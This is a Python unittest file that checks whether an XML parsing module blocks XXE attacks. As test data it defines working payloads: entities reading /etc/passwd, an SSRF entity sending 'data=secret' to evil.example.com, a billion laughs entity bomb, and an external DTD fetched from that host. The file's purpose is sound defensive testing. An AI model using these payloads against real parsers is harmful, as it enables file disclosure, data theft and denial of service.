#!/usr/bin/env python3
"""
Security tests for FDA-81: XXE vulnerability prevention in XML parser.

Verifies that estar_xml.py correctly blocks XML External Entity (XXE) attacks
including:
- File disclosure via external entities
- Server-Side Request Forgery (SSRF) via external entities
- Billion laughs (entity expansion bomb)
- DTD-based attacks
"""
import os
import sys
import tempfile
import unittest

# Add scripts directory to path

# Import the safe parsing functions from estar_xml
try:
    from estar_xml import safe_fromstring, safe_parse, _HAS_DEFUSEDXML
    PARSER_AVAILABLE = True
except ImportError:
    PARSER_AVAILABLE = False


# --- XXE Attack Payloads ---

# Classic XXE: attempt to read /etc/passwd
XXE_FILE_DISCLOSURE = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
"""

# XXE via parameter entity
XXE_PARAMETER_ENTITY = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>
"""

# SSRF: attempt to make HTTP request
XXE_SSRF = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.example.com/steal?data=secret">
]>
<root>&xxe;</root>
"""

# Billion Laughs (entity expansion bomb / XML bomb)
XXE_BILLION_LAUGHS = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
"""

# External DTD loading
XXE_EXTERNAL_DTD = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://evil.example.com/evil.dtd">
<root>test</root>
"""

# Valid XML (should parse successfully)
VALID_XML = b"""<?xml version="1.0" encoding="UTF-8"?>
<root>
  <device>
    <name>Test Device</name>
    <code>ABC</code>
  </device>
</root>
"""


@unittest.skipUnless(PARSER_AVAILABLE, "estar_xml module not importable")
class TestXXEProtection(unittest.TestCase):
    """Verify XXE attacks are blocked by safe_fromstring."""

    def test_valid_xml_parses_successfully(self):
        """Legitimate XML should parse without error."""
        doc = safe_fromstring(VALID_XML)
        self.assertIsNotNone(doc)
        self.assertEqual(doc.tag, 'root')
        device = doc.find('device')
        self.assertIsNotNone(device)
        self.assertEqual(device.find('name').text, 'Test Device')

    def test_xxe_file_disclosure_blocked(self):
        """File disclosure XXE (reading /etc/passwd) must be blocked."""
        # Should either raise an exception or parse safely without expanding entity
        try:
            doc = safe_fromstring(XXE_FILE_DISCLOSURE)
            # If it parsed, verify the entity was NOT expanded
            text = doc.text or ''
            self.assertNotIn('root:', text,
                "XXE VULNERABILITY: /etc/passwd content was included in parsed output")
        except Exception:
            # Exception is the expected safe behavior
            pass

    def test_xxe_parameter_entity_blocked(self):
        """Parameter entity XXE must be blocked."""
        try:
            doc = safe_fromstring(XXE_PARAMETER_ENTITY)
            text = doc.text or ''
            self.assertNotIn('root:', text,
                "XXE VULNERABILITY: parameter entity expanded /etc/passwd")
        except Exception:
            pass  # Expected

    def test_xxe_ssrf_blocked(self):
        """SSRF via XXE (external HTTP request) must be blocked."""
        try:
            doc = safe_fromstring(XXE_SSRF)
            text = doc.text or ''
            self.assertNotIn('evil.example.com', text,
                "XXE VULNERABILITY: SSRF entity was expanded")
        except Exception:
            pass  # Expected

    def test_billion_laughs_blocked(self):
        """Billion laughs (XML bomb) must be blocked or limited."""
        try:
            doc = safe_fromstring(XXE_BILLION_LAUGHS)
            # If it parsed, verify the expansion is bounded
            text = doc.text or ''
            # A billion laughs would produce millions of characters
            self.assertLess(len(text), 10000,
                "XXE VULNERABILITY: entity expansion bomb was not mitigated")
        except Exception:
            pass  # Expected

    def test_external_dtd_blocked(self):
        """External DTD loading must be blocked."""
        try:
            doc = safe_fromstring(XXE_EXTERNAL_DTD)
            # Should parse but without loading the external DTD
            self.assertIsNotNone(doc)
        except Exception:
            pass  # Expected (blocking is fine)


@unittest.skipUnless(PARSER_AVAILABLE, "estar_xml module not importable")
class TestSafeParseFile(unittest.TestCase):
    """Verify XXE attacks are blocked by safe_parse (file-based)."""

    def test_valid_xml_file(self):
        """Legitimate XML file should parse correctly."""
        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False) as f:
            f.write(VALID_XML)
            temp_path = f.name

        try:
            tree = safe_parse(temp_path)
            root = tree.getroot()
            self.assertEqual(root.tag, 'root')
        finally:
            os.unlink(temp_path)

    def test_xxe_attack_in_file_blocked(self):
        """XXE in a file must be blocked by safe_parse."""
        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False) as f:
            f.write(XXE_FILE_DISCLOSURE)
            temp_path = f.name

        try:
            try:
                tree = safe_parse(temp_path)
                root = tree.getroot()
                text = root.text or ''
                self.assertNotIn('root:', text,
                    "XXE VULNERABILITY: file-based XXE expanded /etc/passwd")
            except Exception:
                pass  # Expected
        finally:
            os.unlink(temp_path)


@unittest.skipUnless(PARSER_AVAILABLE, "estar_xml module not importable")
class TestDefusedXMLPresence(unittest.TestCase):
    """Verify defusedxml is available (required dependency)."""

    def test_defusedxml_is_installed(self):
        """defusedxml must be available as a required security dependency."""
        self.assertTrue(_HAS_DEFUSEDXML,
            "defusedxml is NOT installed. This is a CRITICAL security gap. "
            "Install with: pip install defusedxml>=0.7.1")


@unittest.skipUnless(PARSER_AVAILABLE, "estar_xml module not importable")
class TestSafeFromstringStringInput(unittest.TestCase):
    """Verify safe_fromstring handles both str and bytes input."""

    def test_string_input(self):
        """safe_fromstring should accept str input."""
        xml_str = '<root><item>hello</item></root>'
        doc = safe_fromstring(xml_str)
        self.assertEqual(doc.tag, 'root')

    def test_bytes_input(self):
        """safe_fromstring should accept bytes input."""
        xml_bytes = b'<root><item>hello</item></root>'
        doc = safe_fromstring(xml_bytes)
        self.assertEqual(doc.tag, 'root')


if __name__ == '__main__':
    unittest.main()
